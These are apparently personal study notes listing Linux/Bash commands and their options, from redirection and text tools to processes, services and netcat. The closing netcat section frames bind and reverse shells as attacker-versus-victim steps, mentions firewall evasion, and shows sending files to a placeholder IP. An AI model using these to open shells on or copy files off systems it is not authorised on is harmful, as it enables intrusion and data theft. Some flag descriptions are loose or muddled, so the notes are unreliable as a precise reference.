# BASH commands

type - shows if the command is internal or external

set / unset - sets a local/global variable and displays the values

env - displays existing global variables

echo - displays whatever you have typed in standard input

history - displays the previously typed commands

man - displays info about whatever command you want

info - displays a html page with info regarding the command

help - diplays info about the builtin shell commands

whatis / whereis - displays limited info about the command

---

# Sequence commands

; - used to separate commands runs the next command regardless of the prior command

&& - 'And' executes the command if previous command succeeded

|| - 'Or' executes the command if previous command failed 

!! - executes the previous command in history

!\<num> - executes the numbered command in history

\> - creates a new file if file already exists it overwrites it

\>> - appends output to an existing file or creates a new file

2> - creates a new file from stderr

2>> - appends stderr to a file

&> - creates a new file with stdinput and stderr

< - takes input from an existing file

<< - accepts text on the following lines as stdinput

---

# Running commands

tee - displays stdoutput and saves to a file at the same time

xargs - reads from stdinput separated by blanks and executes a command on each

`` - allows commands to be inserted in other commands

$() - also allows commands to be inserted in other commands

cat - used to combine or view files

tac - same as above but works in reverse

join - combines two files by matching the contents of the specified file

expand - converts tabs into spaces and unexpand places the tabs back

od - (octal dump) displays the output in octal -tx displays in hex

sort - sorts contents in alphabetical order

split - splits a file into 2 or more smaller files  

*    -l splits by line  
*    -b bytes  
*    -c size  

uniq - reports or omits repeated lines

head - shows first 10 lines of a file

tail - shows last 10 lines of a file

less - screen pager to view files

more - as above with less options

---

# File summarising commands

cut - cuts sections from each file

grep - searchs text in a file  

* -E uses regex  
* -v does reverse search

sed - powerful stream editor, can insert, delete, substitute or append to a file  

* = displays line number  
* a\<text> appends text to a file  
* i\<text> inserts text into a file  
* r <filename> appends selection into a new file  
* c\<text> replace selected lines with text  
* w saves pattern to a new file  
* q quit

---

# File commands

cd - change directory  

* - goes back to previous directory  
* .. moves up one directory level  
* ~ or empty goes back to home folder

ls - lists files

* -l long listing  
* -a list all files including dot files  
* -h human readable sizes  
* -R recursive listing  
* -F appends a file descriptor to the listing

file - shows file type

cp - copies files

    -r copies directories  
    -R recursive copy  
    -i checks if a copy already exists  

mv - moves or renames files

    -p preserve timestamp  
    -R recursive move  
    -a archive files  

touch - makes a new file

rm - removes a file  

    -r removes a directory

rmdir - removes a directory

mkdir - make a new directory

---

# Searching commands

find - brute force search

locate - uses a database to find files   

    - database is in /etc/updatedb.conf  
    - updatedb - command to update the database  
    - n limits find results  
    - i ignore case  
    - s show state of the database  

whereis - helps locate binaries, source files and man pages 

which - shows where the command is found only if in path

    - a shows all options of the command 

---

# File ownerhsip

File Type Codes  

 - d Directory  
 - b Block device   
 - c Character device  
 - - Data file   
 - l Symbolic link  
 - p Named pipe  
 - s socket  

chmod - change mode of a file

suid - run program with owners privileges

sgid - run program with groups privileges

sticky bit - protects files from being deleted

chown - change owner or group of a file

    - cat /etc/passwd shows users on a machine
    - cat /etc/group shows groups on a machine

ps - process status displays running processes

    - u displays current users programs
    - a displays all processes from all users
    - x displays processes not initiated by the current user

pstree - shows processes in a tree format

pgrep - shows pid of processes

    - u shows user

kill - sends a signal to any process

    - l lists 
    - code 1 - kills process normally 
    - code 9 - kills instantly
    - code 15 - kills but allows files to be saved

killall - kills programs with a number of processes

pkill - kills based on UID or GID

fg - brings process to the foreground

bg - sends process to the background

jobs - displays programs that are running

ctrl-z - pauses program to allow to be placed in the background

& - add after program starts the process in the background

---

# Services

systemctl \<option> name

    - isolate
    - start
    - stop 
    - reload
    - restart
    - states
    - enable
    - disable

service \<name> option

    - start
    - stop
    - status
    - restart

netstat - shows the state each port and application

    - a shows both listening and non-listening ports
    - t shows tcp ports
    - n show numerical adresses
    - u shows udp ports
    - p shows pid
    - c shows continuous view
    - l lists all listening
    - 5/ refresh every 5 seconds
    - ie like ifconfig
    - s kernel ip-routing
    - i net interfaces

ss - Socket Statistics very similar to netstat

---

# Network connections

netcat - reads and writes to TCP and UDP connections

    - l set to listening
    - u use UDP mode
    - p set specific port
    - e execute command after connection
    - s local source port
    - L persistent listener (windows only)
    - wN defines a timeout
    - v verbose
    -n numeric port only don't use DNS

## examples

listening on port 4444  
`nc -nlvp 4444`  
connect to listener  
`nc -nv <ip address> 4444`  
send a file  
`nc -nv <ip address> 4444 < file-sent.txt`  
Recieve a file  
`nc -nlvp 4444 > file-recieved.txt`

## Bind Shell
Occurs when you have the connection come from the attacker, and the victim is the listener  
kali  
`nc -nv <ip address> 4444`  
host  
`nc -nlvp 4444`

## Reverse Shell
Occurs when the victim initiates the connection, better chance of getting through firewalls  
kali  
`nc -nlvp 4444`  
victim  
`nc -nv <ip adress> 4444`

ncat - alternative to nc which can use ssh for a secured connection

sbd - netcat clone which is portable and runs on windows
